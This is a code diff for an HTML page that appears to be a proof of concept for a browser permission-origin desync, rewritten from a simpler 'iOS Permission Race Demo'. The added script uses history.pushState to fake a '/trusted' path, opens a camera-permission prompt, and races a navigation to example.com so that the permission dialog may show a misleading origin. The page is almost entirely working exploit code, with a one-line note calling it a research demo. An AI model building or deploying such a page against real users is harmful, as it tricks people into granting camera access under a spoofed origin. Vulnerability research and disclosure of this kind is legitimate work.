@@ -1,27 +1,101 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>iOS Permission Race Demo</title>
-<script>
-onclick = async () => {
-    // Trigger camera permission
-    navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-            document.body.innerHTML += "<h2>Camera granted</h2>";
-        })
-        .catch(err => {
-            document.body.innerHTML += "<h2>Permission denied</h2>";
-        });
+<meta charset="utf-8">
+<title>Camera Origin Desync Research</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
 
-    // Immediately try to navigate
-    setTimeout(() => {
-        window.location.href = "https://example.com";
-    }, 10);
+<style>
+body {
+  margin: 0;
+  font-family: -apple-system, BlinkMacSystemFont, system-ui;
+  background: #f5f5f7;
 }
-</script>
+button {
+  font-size: 15px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  border: none;
+  background: #007aff;
+  color: #fff;
+}
+#panel {
+  display: none;
+  max-width: 420px;
+  margin: 80px auto;
+  background: #fff;
+  padding: 24px;
+  border-radius: 16px;
+  box-shadow: 0 20px 60px rgba(0,0,0,.2);
+  text-align: center;
+}
+video {
+  width: 100%;
+  border-radius: 12px;
+  margin-top: 12px;
+}
+.notice {
+  margin-top: 14px;
+  font-size: 13px;
+  color: #b00020;
+}
+</style>
 </head>
+
 <body>
-<h1>Tap anywhere</h1>
+
+<div style="text-align:center; margin-top:60px;">
+  <button id="trigger">Start PoC</button>
+</div>
+
+<div id="panel">
+  <h2>Request Camera</h2>
+  <p>Tap the button below to request Camera permission.</p>
+
+  <button onclick="getCamera()">Enable Camera</button>
+  <video id="preview" autoplay playsinline></video>
+
+  <div class="notice">
+    Research demo — observe origin shown in permission dialog
+  </div>
+</div>
+
+<script>
+const panel   = document.getElementById('panel');
+const trigger = document.getElementById('trigger');
+const preview = document.getElementById('preview');
+
+async function getCamera() {
+  if (!navigator.mediaDevices) return;
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: true
+    });
+
+    preview.srcObject = stream;
+  } catch (err) {
+    console.log("Permission denied or cancelled");
+  }
+}
+
+/* Step 1: URL manipulation */
+trigger.onclick = () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+};
+
+/* Step 2: Navigation race */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://example.com';
+      }, 80);
+    });
+  });
+});
+</script>
+
 </body>
 </html>
